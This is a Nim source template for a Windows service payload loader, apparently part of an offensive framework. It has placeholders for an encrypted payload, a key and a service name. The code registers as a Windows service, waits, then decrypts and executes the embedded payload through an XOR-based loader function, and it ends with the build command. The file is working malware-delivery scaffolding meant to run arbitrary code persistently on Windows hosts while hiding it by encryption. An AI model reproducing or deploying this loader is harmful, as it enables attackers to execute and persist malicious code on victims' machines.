import std/os
import winim/lean
import {load_func}
import ../core/crypto/exor/xorro

{payload}

var key: string = {key}

# TODO: the serice name is hardcoded. It would be nice to make it configurable
# via JSON config, however I need to add logic that is specific for SVC.
# For now, change it here in the template.
var SERVICE_NAME: LPTSTR =  "{service_name}".LPTSTR
var gSvcStatus: SERVICE_STATUS
var gSvcStatusHandle: SERVICE_STATUS_HANDLE

proc SVCCtrlHandler(dwCtrl: DWORD) {.stdcall.} =
    if dwCtrl == SERVICE_CONTROL_PAUSE:
        gSvcStatus.dwCurrentState = SERVICE_PAUSED
    if dwCtrl == SERVICE_CONTROL_CONTINUE:
        gSvcStatus.dwCurrentState = SERVICE_RUNNING
    if dwCtrl == SERVICE_CONTROL_STOP:
        gSvcStatus.dwCurrentState = SERVICE_STOPPED
    if dwCtrl == SERVICE_CONTROL_SHUTDOWN:
        gSvcStatus.dwCurrentState = SERVICE_STOPPED

proc SVCMain(dwArgc: DWORD, lpszArgv: ptr pointer) {.stdcall.} =
    gSvcStatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, SVCCtrlHandler)

    gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    gSvcStatus.dwCurrentState = SERVICE_START_PENDING;

    gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_PAUSE_CONTINUE or
                SERVICE_ACCEPT_STOP or
                SERVICE_ACCEPT_SHUTDOWN;

    gSvcStatus.dwWin32ExitCode = NO_ERROR;
    gSvcStatus.dwServiceSpecificExitCode = 0;
    gSvcStatus.dwCheckPoint = 1;
    gSvcStatus.dwWaitHint = 3000;

    discard SetServiceStatus(gSvcStatusHandle, addr gSvcStatus)

    if gSvcStatusHandle == 0:
        return

    try:
        sleep(5000)

        gSvcStatus.dwCurrentState = SERVICE_RUNNING;

        discard SetServiceStatus(gSvcStatusHandle, addr gSvcStatus)

        loadPayload(addr(payload[0]), payload.len, key)

        while gSvcStatus.dwCurrentState != SERVICE_STOPPED:
            sleep(5000)

        gSvcStatus.dwWin32ExitCode = ERROR_SERVICE_SPECIFIC_ERROR
        gSvcStatus.dwServiceSpecificExitCode = 1
        gSvcStatus.dwCheckPoint = 0

        discard SetServiceStatus(gSvcStatusHandle, addr gSvcStatus)

        return
    except:
        gSvcStatus.dwCurrentState = SERVICE_STOPPED;
        gSvcStatus.dwWin32ExitCode = ERROR_SERVICE_SPECIFIC_ERROR
        gSvcStatus.dwServiceSpecificExitCode = 1
        gSvcStatus.dwCheckPoint = 0

        discard SetServiceStatus(gSvcStatusHandle, addr gSvcStatus)

        return

proc main() =
    var dispatchTable: array[2, SERVICE_TABLE_ENTRY]

    dispatchTable[0].lpServiceName = SERVICE_NAME
    dispatchTable[0].lpServiceProc = cast[LPSERVICE_MAIN_FUNCTION](SVCMain)
    dispatchTable[1].lpServiceName = nil
    dispatchTable[1].lpServiceProc = nil

    if not StartServiceCtrlDispatcher(addr dispatchTable[0]):
        echo "Dispatcher failed: ", GetLastError()

when isMainModule:
    main()

# compile with: nim c -d:release -d:mingw -d:strip --app:console --cpu:amd64 core/loaders/svc/svclegacy.nim
